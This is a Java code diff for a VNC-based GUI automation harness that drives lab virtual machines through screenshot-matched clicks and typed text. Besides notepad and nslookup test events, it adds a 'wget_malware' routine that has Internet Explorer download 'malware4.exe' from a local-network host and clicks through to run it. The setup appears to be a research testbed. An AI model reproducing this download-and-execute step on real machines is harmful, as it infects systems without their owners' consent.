@@ -9,29 +9,69 @@ public class Launch {
 		Server server = new Server();
 		Client vm3 =  new Client( "VM3", "localhost", 5902);
 		Client vm2 =  new Client( "VM2", "localhost", 5901);
+		Client vm1 =  new Client( "VM1", "localhost", 5900);
 		server.newConnection(vm3);
 		server.newConnection(vm2);
+		server.newConnection(vm1);
 		server.initClientScreens();
-		Event event_browser = openBrowser();
-		Event event_openNotePad = openNotePad_win7();
-//		Event event_combo = Control_Alt_Del_Combo();
-//		Event event_editor = openEditor();
+		Event event_openNotePad_win8 = openEditor();
+		Event event_nslookup = nsLookup();
 		
 		Thread.sleep(2000);    /* To Make sure the VNCThread is created */
 		System.out.println("Note: time of initialization 2 secs");
 		
-		server.getHandler("VM3").addService(event_browser);
-		server.getHandler("VM2").addService(event_openNotePad);
+//		server.getHandler("VM3").addService(event_openNotePad_win8);
+//		server.getHandler("VM3").addService(event_nslookup);
+		server.getHandler("VM2").addService(wget_malware());
+		
 		
 		server.doService();
+		server.listConnection();
 		server.closeConnection("VM3");
 		server.closeConnection("VM2");
+		server.listConnection();
+		
+		
+//		Client vm2 =  new Client( "VM2", "localhost", 5901);
+//		server.newConnection(vm2);
+//		server.getHandler("VM2").addService(event_openNotePad);
+//		server.closeConnection("VM2");
 	}
 
+	private static Executable wget_malware() {
+		Event event = new Event();
+		ClickCommand clickcmd1 = new ClickCommand("image/IE_icon.png","image/IE_showup.png");
+		TypeCommand typecmd1 = new TypeCommand(
+				"192.168.1.12/file/malware4.exe\n", null, "image/IE_url_line.png");
+		ClickCommand clickcmd2 = new ClickCommand("image/malware_execute.png");
+		ClickCommand clickcmd3 = new ClickCommand("image/malware_exe_confirm.png");
+		ClickCommand clickcmd4 = new ClickCommand("image/malware_close.png");
+		ClickCommand clickcmd5 = new ClickCommand("image/malware_close_confirm.png");
+		
+		event.addCommand(clickcmd1);
+		event.addCommand(typecmd1);
+		event.addCommand(clickcmd2);
+		event.addCommand(clickcmd3);
+		event.addCommand(clickcmd4);
+		event.addCommand(clickcmd5);
+		
+		return event;
+	}
+
+	private static Event nsLookup(){
+		Event event = new Event();
+		ClickCommand clickcmd1 = new ClickCommand("image/window8_cmd.png","image/Command_prompt.png");
+		TypeCommand typecmd1 = new TypeCommand("nslookup www.nctu.edu.tw\n");
+		event.addCommand(clickcmd1);
+		event.addCommand(typecmd1);
+		return event;
+		
+	}
+	
 	private static Event openNotePad_win7() {
 		Event event = new Event();
-//		ClickCommand clickcmd1 = new ClickCommand("image/window_icon.png", "image/search_icon_showup.png");
-		ClickCommand clickcmd1 = new ClickCommand("image/trash_icon.png", "image/search_icon_showup.png");
+		ClickCommand clickcmd1 = new ClickCommand("image/window_icon.png", "image/search_icon_showup.png");
+//		ClickCommand clickcmd1 = new ClickCommand("image/trash_icon.png", "image/search_icon_showup.png");
 		TypeCommand typecmd1 = new TypeCommand("notepad");
 		ClickCommand clickcmd2 = new ClickCommand("image/notepad_in_search.png", "image/notepad_showup.png");
 		TypeCommand typecmd2 = new TypeCommand("This is OpenNotepad Test case in Win7\n");
